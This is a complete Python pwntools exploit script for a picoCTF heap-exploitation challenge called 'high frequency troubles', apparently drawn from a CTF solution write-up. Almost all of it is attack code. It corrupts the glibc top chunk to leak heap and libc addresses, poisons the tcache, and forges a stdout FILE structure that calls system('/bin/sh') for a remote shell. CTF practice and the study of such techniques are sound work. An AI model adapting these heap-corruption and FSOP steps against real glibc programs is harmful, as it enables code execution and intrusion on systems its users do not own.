#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./hft_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc tethys.picoctf.net 57745"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


# https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L1939
DEFAULT_MMAP_THRESHOLD = 0x20000  # (128 * 1024)
PAGE_SIZE = 0x1000
env = {}
io = start()

# based on https://hackmd.io/@Zzzzek/r14x13FRp#high-frequency-troubles

new_top_chunk_size = 0x600 | 0x20  # make sure that the first byte is not NULL such that we can leak it using printf  # noqa
# determine based on PAGE_SIZE to pass the page alignment check
# malloc.c:2716: sysmalloc: (old_end & (pagesize - 1)) == 0
sz = (PAGE_SIZE * 1) - 0x290 - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"A" * (sz - 0x10)
# need the prev_inuse_bit to pass prev_inuse assertion at
# malloc.c:2716: sysmalloc
payload += flat(0, new_top_chunk_size | 0x1)
# overwrite the top chunk size to get unsorted bin on next allocation [1]
io.sendlineafter(b"[PKT_RES]", payload)

"""
We need to corrupt the top chunk size such that the check `brk == old_end`
on malloc.c:2772 is false and we get to the else branch which has the code
path to call `_int_free` on our top chunk
"""

payload = flat(0x1000 - 0x10, 0x0)
# request allocation larger than current top chunk size forces sysmalloc
# and causes the top_chunk to be freed by _int_free(av, old_top, 1)
# this top_chunk goes into unsorted bin
io.sendlineafter(b"[PKT_RES]", payload)  # [1]
io.sendlineafter(b"[PKT_RES]", payload)  # this allocation sorts previous unsorted bin into large bin  # noqa

payload = flat(0x100, 1)
io.sendlineafter(b"[PKT_RES]", payload[:-1])

io.recvuntil(b":[")
heap_leak = u64(io.recvuntil(b"]", drop=True).ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")

new_top_chunk_size = 0x100
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"B" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

# padding to reduce the distance when performing tcache poisoning
for i in range(0x1f):
    payload = flat(0x1000 - 0x10, 0)
    io.sendlineafter(b"[PKT_RES]", payload)


new_top_chunk_size = 0x200
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"C" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

new_top_chunk_size = 0x100
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"D" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0x1000 - 0x10, 0x0)
io.sendlineafter(b"[PKT_RES]", payload)

# remainder our large bin to send it to unsorted bin
payload = flat(0x180, 0x0)
io.sendlineafter(b"[PKT_RES]", payload)

# sort unsorted bins
payload = flat(0x1000 - 0x10, 0)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0x200 - 0x20 - 0x10, 0x0)
payload += b"E" * 0x8 + p64(0)
payload += b"\x00" * 0x30e0
pos = heap_leak + 0x65520
large_bin_pos = heap_leak + 0x2a0
payload += p64(mangle(pos, large_bin_pos))
io.sendlineafter(b"[PKT_RES]", payload[:-1])

payload = flat(0xe0 - 0x10, 0)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0xe0 - 0x10, 1)
io.sendlineafter(b"[PKT_RES]", payload[:-1])

io.recvuntil(b":[")
libc_leak = u64(io.recvuntil(b"]", drop=True).ljust(8, b"\x00"))
libc.address = libc_leak - 0x21a030
log.info(f"{libc.address=:#x}")
assert (libc.address & 0xfff == 0)

new_top_chunk_size = 0x120
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"F" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

# padding to reduce the distance when performing tcache poisoning
for i in range(0x1f):
    payload = flat(0x1000 - 0x10, 0)
    io.sendlineafter(b"[PKT_RES]", payload)

new_top_chunk_size = 0x220
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"G" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

new_top_chunk_size = 0x120
sz = (PAGE_SIZE * 1) - new_top_chunk_size - 0x10
payload = flat(sz, 0)
payload += b"H" * 0x8
payload += b"\x00" * (sz - 0x18)
payload += flat(0, new_top_chunk_size | 0x1)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0x1000 - 0x10, 0x0)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0x220 - 0x20 - 0x10, 0x0)
payload += b"Y" * 0x8 + p64(0)
payload += b"\x00" * 0x30e0
pos = heap_leak + 0xcb500
payload += p64(mangle(pos, libc.sym["_IO_2_1_stdout_"] - 0x10))
io.sendlineafter(b"[PKT_RES]", payload)

# https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout
gadget = libc.address + 0x0016a197  # add rdi, 0x10; jmp rcx;
libc_stdout = libc.sym["_IO_2_1_stdout_"]

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
# the function that we will call: system()
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock = libc.sym["_IO_stdfile_1_lock"]
fake._codecvt = libc_stdout + 0xb8
# _wide_data just need to points to empty zone
fake._wide_data = libc_stdout + 0x200
fake.unknown2 = (p64(0) * 2 + p64(libc_stdout + 0x20) +
                 p64(0) * 3 + p64(libc.sym['_IO_wfile_jumps'] - 0x18))

payload = flat(0x120 - 0x20 - 0x10, 0)
io.sendlineafter(b"[PKT_RES]", payload)

payload = flat(0x120 - 0x20 - 0x10, 0)
io.sendlineafter(b"[PKT_RES]", payload + bytes(fake))

io.interactive()
